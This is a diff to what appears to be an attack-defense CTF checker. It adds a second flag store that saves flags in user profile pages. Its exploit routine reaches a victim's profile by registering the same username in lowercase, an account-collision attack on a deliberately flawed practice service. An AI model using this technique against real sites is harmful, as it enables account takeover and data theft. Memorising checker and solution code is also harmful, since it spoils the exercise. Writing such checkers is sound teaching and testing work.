@@ -185,3 +185,91 @@ async def exploit_test(
         return flag
     logger.warning("NOT the right FLAG in FILE, decoding failed: " + flag_text)
     raise MumbleException("Wrong Flag found")
+
+
+# Second Flag Store
+
+
+@checker.putflag(1)
+async def putflag_test2(
+    task: PutflagCheckerTaskMessage,
+    client: AsyncClient,
+    db: ChainDB,
+) -> None:
+    logger.info("START PUTFLAG 2")
+    length = 24
+    letters = string.ascii_letters
+    username = "".join(random.choice(letters) for _ in range(length))
+    password = str(secrets.token_hex(16))
+    logger.info("Trying to login...")
+    # Register if it is first round otherwise login in
+    response = await utils.register_user_and_login(client, username, password, logger)
+    logger.info("Admin LOGGED IN")
+    # Write in "festivals" textarea the flag
+    data = {
+        "bio": "I am a huge fan of Banana Techno",
+        "festivals": task.flag,
+    }
+    response = await client.post(
+        "/about_" + username,
+        data=data,
+    )
+    if response.status_code != 200:
+        raise MumbleException("Flag store failed")
+    await db.set("info", (username, password, ""))
+    # attack info
+    return f"{username}"
+
+
+@checker.getflag(1)
+async def getflag_test2(
+    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
+) -> None:
+    # login and check that file exists
+    logger.info("START get flag2 , try to loggin")
+    try:
+        username, password, filename = await db.get("info")
+    except KeyError:
+        raise MumbleException("flag missing")
+    await utils.login(client, username, password, logger)
+    logger.info("Try to get to profile page")
+    response = await client.get("/about_" + username)
+    # Find flag in response text
+    if response.status_code != 200:
+        logger.info("Lookup failed " + response.status_code)
+        raise MumbleException("Lookup of file failed")
+    logger.info("SUCCESSFULLY REACHED Profile page")
+    if task.flag not in response.text:
+        logger.info("FLAG SHOULD BE " + task.flag)
+        raise MumbleException("Wrong flag value")
+    logger.info("Successfully got flag!")
+
+
+@checker.exploit(1)
+async def exploit_test2(
+    searcher: FlagSearcher,
+    client: AsyncClient,
+    task: ExploitCheckerTaskMessage,
+) -> Optional[str]:
+    assert_equals(type(task.attack_info), str, "attack info missing")
+    victim_name = task.attack_info
+    # Evil account credentials
+    length = 10
+    letters = string.ascii_letters
+    username = victim_name.lower()
+    password = "".join(random.choice(letters) for _ in range(length))
+    # register
+    await utils.register_user_and_login(client, username, password, logger)
+
+    response = await client.get("/about_" + victim_name)
+
+    if response.status_code == 200:
+        logger.info("Attack reaching profile success")
+    else:
+        raise MumbleException("Attack failed")
+
+    # Find flag in response text
+    if flag := searcher.search_flag(response.text):
+        return flag
+    logger.warning("NOT the right FLAG in Profile")
+    raise MumbleException("Wrong Flag found")
